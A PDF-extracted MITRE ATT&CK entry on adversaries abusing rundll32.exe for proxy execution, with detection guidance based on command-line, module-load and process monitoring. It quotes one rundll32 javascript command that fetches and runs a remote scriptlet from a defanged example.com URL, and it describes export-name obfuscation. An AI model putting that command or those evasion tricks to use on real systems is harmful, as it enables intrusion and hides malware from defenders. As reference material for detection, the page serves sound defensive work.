https://attack.mitre.org/techniques/T1218/011/ 3/11System Binary Proxy Execution: Rundll32
Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules),
may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from
normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction} ).
Rundll32.exe can also be used to execute Control Panel Item ﬁles (.cpl) through the undocumented shell32.dll functions Control\_RunDLL
and Control\_RunDLLAsUser . Double-clicking a .cpl ﬁle also causes rundll32.exe to execute. 
Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe
javascript:"..\mshtml,RunHTMLApplication
";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" This behavior has been seen used by
malware such as Poweliks. 
Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function
names. As part of Windows compatibility support for various character sets, rundll32.exe will ﬁrst check for wide/Unicode then ANSI
character-supported functions before loading the speciﬁed function (e.g., given the command rundll32.exe ExampleDLL.dll,
ExampleFunction , rundll32.exe would ﬁrst attempt to execute ExampleFunctionW , or failing that ExampleFunctionA , before loading
ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and
appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe
file.dll,#1 ).
Additionally, adversaries may use Masquerading techniques (such as changing DLL ﬁle names, ﬁle extensions, or function names) to further
conceal execution of a malicious payload.Other sub-techniques of System Binary Proxy Execution (13)

ID Data SourceData Component Detects
DS0017 Command Command
ExecutionCommand arguments used with the rundll32.exe invocation may also be useful in
determining the origin and purpose of the DLL being loaded. Typical command-line usage of
rundll32.exe is "rundll32.exe DllFile,EntryPoint" where DllFile is the name of the
DLL ﬁle being called and EntryPoint the name of the entry point in the DLL ﬁle.
DLLs stored on SMB shares can similarly be called using the syntax of "rundll32.exe
\\DllFile,EntryPoint" where is the IPv4 address of the host of the SMB share.
Rundll32 can also be used to execute arbitrary Javascript using the syntax "rundll32.exe
javascript:< code\_block >"where  is a string deﬁning the Javascript code to be
executed.
DS0022 File File Metadata Analyze contextual data about executed DLL ﬁles, which may include information such as
name, the content (ex: signature, headers, or data/media), age, user/owner, permissions, etc.
DS0011 Module Module Load Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering
obfuscated function calls. Static Portable Executable (PE) analysis tools can be used to
examine and dump the exports of a particular DLL.
DS0009 Process Process
CreationUse process monitoring to monitor the execution and arguments of rundll32.exe. Compare
recent invocations of rundll32.exe with prior history of known good arguments and loaded
DLLs to determine anomalous and potentially adversarial activity.
When monitoring for all instances of Rundll32 execution, as deﬁned by the logic in the
Detection Pseudocode, it is imperative to also investigate the full set of command-line
parameters used. These parameters contain key information about the DLL payload,
including the name, entry point, and optional arguments.
Note: Event IDs are for Sysmon (Event ID 10 - process create) and Windows Security Log
(Event ID 4688 - a new process has been created). The Analytic looks for any instances of
rundll32.exe but does no other ﬁltering, which may result in false positives. Therefore, we
recommend tuning any such analytics by including additional logic (e.g., testing the name of
the user that created the process) that helps reduce false positives.
